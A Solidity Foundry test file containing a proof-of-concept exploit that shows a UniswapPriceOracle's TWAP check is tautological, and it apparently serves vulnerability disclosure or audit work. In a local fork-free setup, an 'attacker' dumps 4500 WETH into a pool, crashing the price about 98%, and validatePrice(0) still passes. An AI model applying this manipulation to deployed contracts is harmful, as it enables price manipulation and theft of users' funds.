pragma solidity ^0.8.28;

import {Test} from "forge-std/Test.sol";
import {UniswapPriceOracle} from "../contracts/oracles/UniswapPriceOracle.sol";
import {ZuniswapV2Factory} from "../lib/zuniswapv2/src/ZuniswapV2Factory.sol";
import {ZuniswapV2Pair} from "../lib/zuniswapv2/src/ZuniswapV2Pair.sol";
import {ZuniswapV2Router} from "../lib/zuniswapv2/src/ZuniswapV2Router.sol";
import {ERC20} from "solmate/tokens/ERC20.sol";

contract Token is ERC20 {
    constructor(string memory s) ERC20(s, s, 18) {}
    function mint(address to, uint256 a) external { _mint(to, a); }
}

/// @title Minimal PoC: UniswapPriceOracle T

WAP is tautological
/// @notice validatePrice() always returns true (except same-block) because its
///         "TWAP" = (C + P*dt - C) / dt = P (spot), so derivation is always 0.
///
/// forge test --match-contract MinimalTWAPExploit -vvv
contract MinimalTWAPExploit is Test {
    Token olas;
    Token weth;
    ZuniswapV2Router router;
    ZuniswapV2Pair pair;
    UniswapPriceOracle oracle;

    function setUp() public {
        vm.warp(1_700_000_000);

        olas = new Token("OLAS");
        weth = new Token("WETH");

        ZuniswapV2Factory factory = new ZuniswapV2Factory();
        router = new ZuniswapV2Router(address(factory));
        pair = ZuniswapV2Pai

r(factory.createPair(address(olas), address(weth)));

        // Seed pool: 1M OLAS / 500 WETH  (price = 2000 OLAS per WETH)
        olas.mint(address(this), 1_000_000e18);
        weth.mint(address(this), 500e18);
        olas.approve(address(router), type(uint256).max);
        weth.approve(address(router), type(uint256).max);
        router.addLiquidity(
            address(olas), address(weth),
            1_000_000e18, 500e18, 0, 0, address(this)
        );

        // Build cumulative price history, then advance so elapsedTime > 0
        vm.warp(block.timestamp + 3600);
        pair.sync();
        vm.warp(block.timestamp + 600);

        oracle = new UniswapPriceOrac

le(address(weth), 50, address(pair));
    }

    /// @notice Crash the price 98% with a real swap; oracle still says "all clear."
    function test_exploit() public {
        uint256 priceBefore = oracle.getPrice();

        // --- Attacker dumps 4500 WETH into a 500-WETH pool ---
        address attacker = makeAddr("attacker");
        weth.mint(attacker, 4500e18);
        vm.startPrank(attacker);
        weth.approve(address(router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(weth);
        path[1] = address(olas);
        router.swapExactTokensForTokens(4500e18, 1, path, attacker);
        vm.stopPrank();

uint256 priceAfter = oracle.getPrice();
        uint256 dropPct = ((priceBefore - priceAfter) * 100) / priceBefore;

        // Price crashed ~98%
        assertGt(dropPct, 90, "price must crash >90%");

        // Advance 1 block so we're past the same-block guard
        vm.warp(block.timestamp + 12);

        // BUG: oracle returns true with ZERO slippage tolerance after a 98% crash
        assertTrue(oracle.validatePrice(0), "EXPLOIT: validatePrice(0) passes after 98% crash");
    }
}",

